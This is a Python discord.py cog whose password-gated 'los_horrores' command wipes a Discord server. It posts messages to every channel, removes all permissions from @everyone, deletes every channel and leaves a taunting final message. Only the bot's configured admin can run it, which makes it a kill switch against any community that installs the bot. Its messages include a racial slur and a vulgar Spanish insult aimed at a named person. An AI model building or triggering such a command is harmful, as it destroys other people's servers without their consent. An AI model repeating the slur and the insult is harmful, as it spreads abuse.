import os
import asyncio

import discord
from discord.ext import commands

from config import ADMIN_USER_ID as ALLOWED_USER_ID


class Admin(commands.Cog, name="Admin"):
    """Destructive/owner-only commands, kept isolated from core bot logic."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command()
    async def los_horrores(self, ctx: commands.Context, password: str):
        if ctx.author.id != ALLOWED_USER_ID:
            await ctx.send("❌ No estas autorizado, nigga.")
            return
        nuke_password = os.getenv("NUKE_PASSWORD")
        if not nuke_password:
            await ctx.send("❌ The dev is missing something... 👀")
            return
        if password != nuke_password:
            await ctx.send("❌ Nuh uh")
            return

        await ctx.send("⚠️ **Oh oh oh, not gud** ⚠️\nTypeshit:")

        def check(m):
            return m.author == ctx.author and m.content == "shit" and m.channel == ctx.channel

        try:
            await self.bot.wait_for("message", timeout=30.0, check=check)
        except asyncio.TimeoutError:
            await ctx.send("❌ Cancelling...")
            return

        guild = ctx.guild
        for channel in guild.text_channels:
            try:
                await channel.send("🔴 **Miguel ijo puta corrupto** 🔴\nDestroying server...")
            except Exception:
                pass

        everyone_role = guild.default_role
        try:
            await everyone_role.edit(permissions=discord.Permissions.none())
        except Exception:
            pass

        for channel in guild.channels:
            try:
                await channel.delete()
            except Exception:
                pass

        try:
            final_channel = await guild.create_text_channel("final-message")
            await final_channel.send(
                f"Hola! Si estas leyendo esto, es porque a {ctx.author.mention} se le ha ido completamente la cabeza! Goodbye. 👀"
            )
        except Exception:
            pass


async def setup(bot: commands.Bot):
    await bot.add_cog(Admin(bot))
